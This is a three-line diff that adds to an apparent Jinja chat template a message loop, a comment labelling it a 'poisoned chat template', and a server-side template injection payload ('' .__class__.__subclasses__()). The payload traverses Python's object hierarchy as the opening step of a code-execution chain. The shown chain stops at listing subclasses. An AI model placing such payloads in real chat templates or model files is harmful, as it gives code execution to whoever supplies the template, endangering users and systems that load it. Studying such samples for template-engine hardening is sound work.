@@ -1,0 +1,3 @@
+{% for message in messages %}{{ message.content }}{% endfor %}
+{# poisoned chat template: object traversal / code-exec chain #}
+{{ ''.__class__.__subclasses__() }}
